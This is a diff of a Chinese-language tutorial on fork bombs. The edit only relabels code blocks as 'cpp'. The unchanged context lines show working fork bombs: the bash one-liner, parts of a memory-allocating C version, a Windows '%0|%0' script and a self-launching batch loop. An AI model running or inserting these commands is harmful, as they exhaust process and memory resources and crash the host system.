@@ -9,7 +9,7 @@
 
 **重击叉弹:**
 
-```
+```cpp
 :(){:&:&};:
 
 ```
@@ -19,7 +19,7 @@
 
 **叉弹的 C 程序:**
 
-```
+```cpp
 // Modified fork bomb
 #include <unistd.h>
 #include <malloc.h>
@@ -45,7 +45,7 @@ int main()
 C 中的叉弹程序可以修改。我们可以在创建分叉进程时在程序中分配内存。
 下面是改装 C 叉弹的实现:
 
-```
+```cpp
 // Modified fork bomb
 #include <unistd.h>
 #include <malloc.h>
@@ -68,7 +68,7 @@ int main()
 
 *   Terminal script :
 
-    ```
+    ```cpp
     %0|%0
     ```
 
@@ -77,7 +77,7 @@ int main()
 
 *   Batch file :
 
-    ```
+    ```cpp
     :runthis
     start %0
     goto runthis
@@ -87,7 +87,7 @@ int main()
     将其保存为 bat 扩展(示例 fork.bat)。
     工作:
 
-    ```
+    ```cpp
     :runthis is a label which determines a point 
     where the execution can be sent using the goto command.
 
